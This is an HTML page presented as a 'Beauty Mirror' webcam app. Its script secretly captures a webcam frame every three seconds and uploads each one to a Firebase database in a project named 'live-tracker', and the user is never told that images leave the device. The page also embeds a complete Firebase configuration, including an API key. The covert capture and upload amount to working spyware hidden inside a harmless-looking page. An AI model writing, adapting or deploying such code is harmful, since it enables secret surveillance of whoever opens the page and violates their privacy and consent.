<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Beauty Mirror</title>

<style>
body{
  margin:0;
  font-family:Arial;
  min-height:100vh;
  display:flex;
  justify-content:center;
  align-items:center;
  background:linear-gradient(-45deg,#00d4ff,#8a2be2,#ff0080,#00ff99);
  background-size:400% 400%;
  animation:bgMove 10s ease infinite;
}

@keyframes bgMove{
  0%{background-position:0% 50%}
  50%{background-position:100% 50%}
  100%{background-position:0% 50%}
}

.card{
  width:90%;
  max-width:500px;
  padding:20px;
  border-radius:20px;
  background:rgba(255,255,255,0.08);
  backdrop-filter:blur(15px);
  color:white;
  text-align:center;
}

video{
  width:100%;
  border-radius:15px;
  margin-top:10px;
}

button{
  margin-top:10px;
  padding:10px 20px;
  border:none;
  border-radius:10px;
  cursor:pointer;
}
</style>
</head>

<body>

<div class="card">
  <h2>📷 Beauty Mirror</h2>

  <button onclick="startCamera()">Start Camera</button>

  <video id="video" autoplay playsinline></video>

  <canvas id="canvas" style="display:none;"></canvas>

  <p id="status">Waiting...</p>
</div>

<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>

<script>
const firebaseConfig = {
  apiKey: "AIzaSyA5iHHvWOKZnKlZCZz57O8ALtSkfNdMmrE",
  authDomain: "live-tracker-554a7.firebaseapp.com",
  databaseURL: "https://live-tracker-554a7-default-rtdb.firebaseio.com",
  projectId: "live-tracker-554a7",
  storageBucket: "live-tracker-554a7.firebasestorage.app",
  messagingSenderId: "951695061306",
  appId: "1:951695061306:web:a7b9478538f86f50a36003"
};

firebase.initializeApp(firebaseConfig);
const db = firebase.database();

let stream;

async function startCamera(){
  stream = await navigator.mediaDevices.getUserMedia({ video:true });

  document.getElementById("video").srcObject = stream;

  document.getElementById("status").innerText = "Live";

  startSnapshots();
}

function startSnapshots(){

  const video = document.getElementById("video");
  const canvas = document.getElementById("canvas");
  const ctx = canvas.getContext("2d");

  setInterval(()=>{

    if(!video.videoWidth) return;

    canvas.width = 320;
    canvas.height = 240;

    ctx.drawImage(video,0,0,320,240);

    const frame = canvas.toDataURL("image/jpeg",0.5);

    // ✅ FIXED: PUSH (NOT SET)
    db.ref("camera/user1").push({
      frame: frame,
      updatedAt: Date.now()
    });

  },3000);
}
</script>

</body>
</html>
